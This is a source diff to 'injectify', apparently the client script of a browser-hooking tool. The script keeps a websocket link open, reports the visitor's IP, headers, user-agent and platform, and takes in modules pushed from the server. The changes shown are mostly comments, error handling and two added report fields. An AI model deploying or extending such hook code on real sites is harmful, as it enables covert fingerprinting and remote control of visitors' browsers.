@@ -63,6 +63,9 @@ window['injectify'] = /** @class */ (function () {
      * @param {function} callback
      */
     Injectify.unlisten = function (topic, callback) {
+        /**
+         * If the listener is missing, return false
+         */
         if (!this['listeners'] ||
             !this['listeners'][topic] ||
             !this['listeners'][topic].callback ||
@@ -78,7 +81,9 @@ window['injectify'] = /** @class */ (function () {
      * @param {Object} data Message data
      */
     Injectify.send = function (topic, data) {
-        // If the websocket is dead, return
+        /**
+         * If the websocket is dead, return
+         */
         if (ws.readyState == 0)
             return;
         try {
@@ -89,8 +94,7 @@ window['injectify'] = /** @class */ (function () {
         }
         catch (e) {
             if (this.debug)
-                throw e;
-            this.error(e.stack);
+                console.error(e);
         }
     };
     /**
@@ -188,11 +192,13 @@ window['injectify'] = /** @class */ (function () {
                 project = project.substring(1);
             return {
                 'project': atob(project),
-                'debug': this.debug,
                 'websocket': ws.url,
+                'platform': client.platform,
+                'duration': this.duration,
+                'debug': this.debug,
                 'ip': client.ip,
                 'headers': client.headers,
-                'user-agent': client.agent,
+                'user-agent': client.agent
             };
         },
         enumerable: true,
@@ -226,7 +232,15 @@ window['injectify'] = /** @class */ (function () {
      * @param {error} error The error to be handled
      */
     Injectify.error = function (error) {
+        // this['errorLimiting']++
+        // if (this['errorLimiting'] >= 20) {
+        // 	setTimeout(function() {
+        // 		console.log('called!')
+        // 		this['errorLimiting'] = 0
+        // 	}, 100)
+        // } else {
         this.send('e', error);
+        // }
     };
     return Injectify;
 }());
@@ -250,6 +264,9 @@ window['injectify'].listener(function (data, topic) {
             return;
         }
         if (topic == 'module') {
+            /**
+             * Create the module object
+             */
             var module = {
                 name: data.name,
                 token: data.token,
@@ -290,9 +307,6 @@ window['injectify'].listener(function (data, topic) {
         }
     }
     catch (e) {
-        // if (window['injectify'].debug) {
-        // 	//throw e
-        // }
         window['injectify'].error(e.stack);
     }
 });
